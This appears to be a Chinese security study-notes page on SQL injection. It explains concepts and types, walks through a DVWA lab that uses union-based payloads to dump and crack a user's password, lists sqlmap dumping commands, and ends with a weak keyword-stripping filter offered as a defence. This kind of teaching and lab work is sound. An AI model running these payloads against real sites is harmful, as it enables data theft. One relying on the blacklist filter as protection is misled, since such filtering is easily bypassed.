+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">system_user()系统用户名</span><br><span class="line">user()用户名</span><br><span class="line">current_user() 当前用户名</span><br><span class="line">session_user() 连接数据库用的用户名</span><br><span class="line">database() 数据库名</span><br><span class="line">version() mysql数据库版本</span><br><span class="line">load_file() mysql读取本地文件的函数</span><br><span class="line">@@datadir 数据库路径</span><br><span class="line">@@basedir mysql安装路径</span><br><span class="line">@@version_compile_os 操作系统</span><br></pre></td></tr></table></figure>
+<h1 id="0X01SQL注入相关概念"><a href="#0X01SQL注入相关概念" class="headerlink" title="0X01SQL注入相关概念"></a>0X01SQL注入相关概念</h1><h2 id="静态页面"><a href="#静态页面" class="headerlink" title="静态页面"></a>静态页面</h2><p>html或者htm，是一种静态的页面格式，不需要服务器解析其中的脚本。由浏览器如(IE、Chrome等)解析。</p>
+<blockquote>
+<p>1.不依赖数据库<br>2.灵活性差，制作、更新、维护麻烦<br>3.交互性交差，在功能方面有较大的限制<br>4.安全，不存在SQL注入漏洞</p>
+</blockquote>
+<h2 id="动态页面"><a href="#动态页面" class="headerlink" title="动态页面"></a>动态页面</h2><p>asp、aspx、php、jsp等，由相应的脚本引擎来解释执行，根据指令生成静态网页。</p>
+<blockquote>
+<p>1.依赖数据库<br>2.灵活性好，维护简便<br>3.交互性好，功能强大<br>4.存在安全风险，可能存在SQL注入漏洞，这里要纠正一点，不是会动的或者有动态GIF图片就是动态网站，一定要是有上门所述的脚本语言构成的网站，如下图所示是一个php脚本搭建的动态网站</p>
+</blockquote>
+<h2 id="WEB应用工作原理"><a href="#WEB应用工作原理" class="headerlink" title="WEB应用工作原理"></a>WEB应用工作原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">客户端-&gt;&gt;脚本引擎: 请求</span><br><span class="line">脚本引擎-&gt;&gt;数据库: 请求</span><br><span class="line">数据库-&gt;&gt;脚本引擎: 返回</span><br><span class="line">脚本引擎-&gt;&gt;客户端: 返回</span><br></pre></td></tr></table></figure>
+<h2 id="SQL注入定义"><a href="#SQL注入定义" class="headerlink" title="SQL注入定义"></a>SQL注入定义</h2><p>SQL Injection：就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。<br>具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句<br><strong>本质：</strong>代码数据不区分。<br><strong>成因：</strong>未对用户提交的参数数据进行校验或有效的过滤，直接进行SQL语句拼接，改变了原有SQL语句的语义，传入数据库解析引擎中执行。<br><strong>结果：</strong>SQL注入。</p>
+<h2 id="SQL注入触发"><a href="#SQL注入触发" class="headerlink" title="SQL注入触发"></a>SQL注入触发</h2><p>所有的输入只要和数据库进行交互的，都有可能触发SQL注入<br>常见的包括：<br>Get参数触发SQL注入<br>POST参数触发SQL注入<br>Cookie触发SQL注入<br>其他参与sql执行的输入都有可能进行SQL注入</p>
+<h2 id="SQL注入过程"><a href="#SQL注入过程" class="headerlink" title="SQL注入过程"></a>SQL注入过程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">客户端--&gt;|参数值等数据被修改| 服务端</span><br><span class="line">服务端--&gt;|未经检查和过滤即将被修改的数据注入到SQL命令中,SQL命令功能被修改| 数据库引擎</span><br><span class="line">数据库引擎 --&gt; |执行修改后的SQL语句| 服务端</span><br><span class="line">服务端 --&gt; |将注入的结果返回给客户端| 客户端</span><br></pre></td></tr></table></figure>
+<h2 id="SQL注入场景"><a href="#SQL注入场景" class="headerlink" title="SQL注入场景"></a>SQL注入场景</h2><p><strong>一切用户可控参数的地方，比如：URL路径、GET/POST请求参数、HTTP请求头</strong><br><img src="https://note.youdao.com/yws/public/resource/3748176b04869b8910a652ea5b2451c7/5BAEC8D2679B4E2587677ACFB1717091?ynotemdtimestamp=1595561542771" alt="image"></p>
+<h2 id="SQL注入的作用"><a href="#SQL注入的作用" class="headerlink" title="SQL注入的作用"></a>SQL注入的作用</h2><ul>
+<li>绕过登录验证：使用万能密码登录网站后台等</li>
+<li>获取敏感数据：获取网站管理员帐号、密码等</li>
+<li>文件系统操作：列目录，读取、写入文件等</li>
+<li>注册表操作：读取、写入、删除注册表等</li>
+<li>执行系统命令：远程执行命令</li>
+</ul>
+<h1 id="0X02-注入漏洞分类"><a href="#0X02-注入漏洞分类" class="headerlink" title="0X02 注入漏洞分类"></a>0X02 注入漏洞分类</h1><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p><a href="http://www.test.com/test.php?id=1" target="_blank" rel="external nofollow noopener noreferrer">http://www.test.com/test.php?id=1</a><br>猜测SQL语句为：select * from table where id=1<br><strong>测试：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.test.com&#x2F;test.php?id&#x3D;1’</span><br></pre></td></tr></table></figure>
+<p>SQL语句为：select * from table where id=1’ ，页面出现异常</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.test.com&#x2F;test.php?id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure>
+<p>SQL语句为：select * from table where id=1 and 1=1 ，页面正常</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.test.com&#x2F;test.php?id&#x3D;1 and 1&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>SQL语句为：select * from table where id=1 and 1=2，返回数据与原始请求不同<br><strong>注：当输入的参数为整型时，如：ID，年龄，页码等，如果存在注入漏洞，则可以认为是数字型注入。</strong></p>
+<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>数字型：select * from table where id =1<br>字符型：select * from table where username=‘test’<br>字符型注入最关键的是如何闭合SQL语句以及注释多余的代码<br>查询内容为字符串时：select * from table where username = ‘test’<br><strong>测试：</strong>  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where username &#x3D; &#39;test and 1&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
+
+<p>无法注入，“test and 1=1”会被数据库当作查询的字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where username &#x3D; &#39;test&#39; and &#39;1&#39;&#x3D;&#39;1&#39; --&#39;</span><br></pre></td></tr></table></figure>
+
+<p>必须闭合字符串才可以继续注入</p>
+<p><strong>数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合</strong></p>
+<h2 id="数据库注释的语法"><a href="#数据库注释的语法" class="headerlink" title="数据库注释的语法"></a>数据库注释的语法</h2><p><img src="https://note.youdao.com/yws/public/resource/3748176b04869b8910a652ea5b2451c7/82D676E0EA5942948556A03E0788931C?ynotemdtimestamp=1595561542771" alt="image"></p>
+<h2 id="测试语句"><a href="#测试语句" class="headerlink" title="测试语句"></a>测试语句</h2><p><img src="https://note.youdao.com/yws/public/resource/3748176b04869b8910a652ea5b2451c7/870B902796394F1DA278A5F4324E10B5?ynotemdtimestamp=1595561542771" alt="image"></p>
+<h2 id="SQL注入分类细化"><a href="#SQL注入分类细化" class="headerlink" title="SQL注入分类细化"></a>SQL注入分类细化</h2><h3 id="按照数据类型："><a href="#按照数据类型：" class="headerlink" title="按照数据类型："></a>按照数据类型：</h3><ul>
+<li>数字形（Integer）</li>
+<li>字符型（String）<h3 id="按返回结果："><a href="#按返回结果：" class="headerlink" title="按返回结果："></a>按返回结果：</h3></li>
+<li>显错注入（Error-Based）  </li>
+<li>盲注（Boolean/Time-Based Blind）<h3 id="其他分类"><a href="#其他分类" class="headerlink" title="其他分类"></a>其他分类</h3></li>
+<li>POST注入：注入字段在POST数据中</li>
+<li>Cookie注入：注入字段在Cookie数据中</li>
+<li>搜索注入：注入处为搜索的点</li>
+<li>Baes64注入：注入字符串需要经过base64加密</li>
+<li>布尔型盲注：即可以根据返回页面判断条件真假的注入</li>
+<li>时间延迟型盲注：即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断</li>
+<li>报错回显型注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</li>
+<li>联合查询型注入：可以使用union的情况下的注入</li>
+<li>堆查询型注入：可以同时执行多条语句的执行时的注入<h2 id="演示：以DVWA的字符型注入为例"><a href="#演示：以DVWA的字符型注入为例" class="headerlink" title="演示：以DVWA的字符型注入为例"></a>演示：以DVWA的字符型注入为例</h2><h3 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3>执行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure>
+结果如下:<br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/8F1AEAD8566146EE9A90916A2C37B9C5?ynotemdtimestamp=1595558496664" alt="image"><br>再执行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure>
+结果如下:<br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/C1572B244C5D4E3E8B0DF8004FB9CBE2?ynotemdtimestamp=1595558496664" alt="image"><br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/6923DFA4ACDD48E7A9C4A3219C107972?ynotemdtimestamp=1595558496664" alt="image">  </li>
+</ul>
+<p><strong>表明参数类型为字符型。</strong><br>再执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;and&#39;1&#39;&#x3D;&#39;1&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure>
+<p>结果如下:<br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/DDB4F108E77041FEBF5238C7929C1776?ynotemdtimestamp=1595558496664" alt="image"><br>产生的结果与id=1的内容相同。<br>接着执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;and&#39;1&#39;&#x3D;&#39;2&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure>
+<p>不显示任何内容。<br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/4B275C3B21174DADB1616656887D7722?ynotemdtimestamp=1595558496664" alt="image"><br><strong>表明此处可能存在有注入漏洞。</strong>  </p>
+<h3 id="利用order-by判断该数据表的字段数量"><a href="#利用order-by判断该数据表的字段数量" class="headerlink" title="利用order by判断该数据表的字段数量"></a>利用order by判断该数据表的字段数量</h3><p>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;order by 5%23&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/21F57CB066E04D52915A57F6A19D4A71?ynotemdtimestamp=1595558496664" alt="image"><br>通过更换order by后面的数字，直到能够返回正常的最大值：2<br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/FCB7873DCC7A4EF6A51696F7C7F4CB04?ynotemdtimestamp=1595558496664" alt="image"><br>由此可得到该数据表的字段数为2。  </p>
+<h3 id="用union查询标记可以执行SQL的位置"><a href="#用union查询标记可以执行SQL的位置" class="headerlink" title="用union查询标记可以执行SQL的位置"></a>用union查询标记可以执行SQL的位置</h3><p>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select 1,2%23&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure>
+<p>结果如下是：表明在1,2处可以执行SQL语句。<br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/EDA3549E47FB46E8AC18073A3C83BB12?ynotemdtimestamp=1595558496664" alt="image">  </p>
+<h3 id="用datebase（）函数在1处查询当前数据库名"><a href="#用datebase（）函数在1处查询当前数据库名" class="headerlink" title="用datebase（）函数在1处查询当前数据库名"></a>用datebase（）函数在1处查询当前数据库名</h3><p>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select database(),2%23&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure>
+<p>结果为：<br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/F05FF980BF73460B9833A6E4D895BA20?ynotemdtimestamp=1595558496664" alt="image">  </p>
+<h3 id="查询dvwa数据库的表"><a href="#查询dvwa数据库的表" class="headerlink" title="查询dvwa数据库的表"></a>查询dvwa数据库的表</h3><p>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select table_name from information_schema.tables where table_schema &#x3D; &#39;dvwa&#39; limit0,1),2%23&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/5B2998FC7962433DB6089CB48E7BC245?ynotemdtimestamp=1595558496664" alt="image"><br>得到了dvwa的第一个表guestbook，以同样的方式改变limit的参数为limit1,1可获得第二个表users。如下图：<br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/0BD9BBB87D38446080CE221597DF4D5A?ynotemdtimestamp=1595558496664" alt="image"><br>比较两个表名，推测用户名可能在users表中，故先查询users中的字段。</p>
+<h3 id="查询users表中的字段"><a href="#查询users表中的字段" class="headerlink" title="查询users表中的字段"></a>查询users表中的字段</h3><p>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select column_name from information_schema.columns where table_schema &#x3D; &#39;dvwa&#39; and table_name &#x3D; &#39;users&#39; limit 0,1),2%23&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/C533AEB58240440AA06533BC32663BE0?ynotemdtimestamp=1595558496664" alt="image"><br>得出来users表的的第一个字段为user_id，同理可得第二个为 first_name，第三个为last_name，第四个为user，第五个为password，第六个为avatar，······</p>
+<h3 id="获取user字段的第二个数据和password字段的第二个数据"><a href="#获取user字段的第二个数据和password字段的第二个数据" class="headerlink" title="获取user字段的第二个数据和password字段的第二个数据"></a>获取user字段的第二个数据和password字段的第二个数据</h3><p>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select user from dvwa.users limit 1,1),2%23&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure>
+<p>获得user字段的第二个数据为：<br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/704A3E2C8BE74F35B43432356DBE8B10?ynotemdtimestamp=1595558496664" alt="image"><br>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select password from dvwa.users limit 1,1),2%23&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure>
+<p>获得password字段的第二个数据<br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/7C28C9A86C1245F697C8734A02E08A54?ynotemdtimestamp=1595558496664" alt="image"><br>MD5解密密码得：<br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/74BB051DAC4B41A1B65A36F24C8D81A4?ynotemdtimestamp=1595558496664" alt="image"><br>尝试登陆：<br><img src="https://note.youdao.com/yws/public/resource/6f0c7c0edbc9314143dc3806dafd94fd/7C47BA73990B4C7FBB3A23EF49AE31D6?ynotemdtimestamp=1595558496664" alt="image"><br>登陆成功！ </p>
+<h1 id="0X03SQL注入的利用工具：sqlmap"><a href="#0X03SQL注入的利用工具：sqlmap" class="headerlink" title="0X03SQL注入的利用工具：sqlmap"></a>0X03SQL注入的利用工具：sqlmap</h1><p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。采用五种独特的SQL注入技术，分别是：</p>
+<ul>
+<li>1）基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
+<li>2）基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
+<li>3）基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li>
+<li>4）联合查询注入，可以使用union的情况下的注入。</li>
+<li>5）堆查询注入，可以同时执行多条语句的执行时的注入。<h2 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h2></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 --dbs</span><br></pre></td></tr></table></figure>
+<p>-u 指定检测的URL地址 –dbs列出数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 -D cms --tables</span><br></pre></td></tr></table></figure>
+<p>获取指定数据库cms的表名 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 -D cms -T cms_users --columns</span><br></pre></td></tr></table></figure>
+<p>获取指定数据库cms及指定表cms_users的列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 -D cms -T cms_users -C username,password --dump</span><br></pre></td></tr></table></figure>
+<p>dump列username和password的值</p>
+<p>-r c:\sqltest.txt  加载请求数据<br>–cookie=COOKIE  登录后的cookie<br>–proxy=”<a href="http://127.0.0.1:8080&quot;" rel="external nofollow noopener noreferrer" target="_blank">http://127.0.0.1:8080&quot;</a>  使用HTTP代理  </p>
+<h1 id="0X04防御SQL注入"><a href="#0X04防御SQL注入" class="headerlink" title="0X04防御SQL注入"></a>0X04防御SQL注入</h1><h2 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h2><p>这些危害包括但不局限于：</p>
+<ul>
+<li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</li>
+<li>网页篡改：通过操作数据库对特定网页进行篡改。</li>
+<li>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li>
+<li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</li>
+<li>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li>
+<li>破坏硬盘数据，瘫痪全系统。</li>
+</ul>
+<p>一些类型的数据库系统能够让SQL指令操作文件系统，这使得SQL注入的危害被进一步放大。</p>
+<h2 id="防御手段：过滤用户输入"><a href="#防御手段：过滤用户输入" class="headerlink" title="防御手段：过滤用户输入"></a>防御手段：过滤用户输入</h2><h3 id="过滤对象"><a href="#过滤对象" class="headerlink" title="过滤对象"></a>过滤对象</h3><ul>
+<li>用户的输入</li>
+<li>提交的URL请求中的参数部分</li>
+<li>从cookie中得到的数据</li>
+<li>部署防SQL注入系统或脚本<h3 id="过滤类容"><a href="#过滤类容" class="headerlink" title="过滤类容"></a>过滤类容</h3>单引号、双引号、斜杠、反斜杠、冒号、空字符等的字符，如图PHP中利用<br>str_replace方法把特殊字符替换成空格，如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function dowith_sql($a)&#123;</span><br><span class="line">   $a &#x3D; str_replace(&quot;and&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;execute&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;update&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;count&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;chr&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;ma&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;master&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;truncate&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;char&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;declare&quot;,&quot;&quot;,$a); </span><br><span class="line">   $a &#x3D; str_replace(&quot;select&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;create&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;delete&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;insert&quot;,&quot;&quot;,$a);</span><br><span class="line">   &#x2F;&#x2F;$a &#x3D; str_replace(&quot;&#39;&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;\&quot;&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot; &quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;or&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;&#x3D;&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;%20&quot;,&quot;&quot;,$a);</span><br><span class="line">   return $a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+    
+        <a href="/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E5%9B%9B%E8%8A%82%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Lebih Tua</strong>
+            <div class="article-nav-title">第四节 跨站请求伪造（CSRF）漏洞</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            s40d1 &copy; 2020 
+            <a rel="external nofollow noopener noreferrer" href="http://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png"></a>
+            <br> Powered by <a href="http://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>. Theme - <a href="https://github.com/zthxxx/hexo-theme-Wikitten" target="_blank" rel="external nofollow noopener noreferrer">wikitten</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
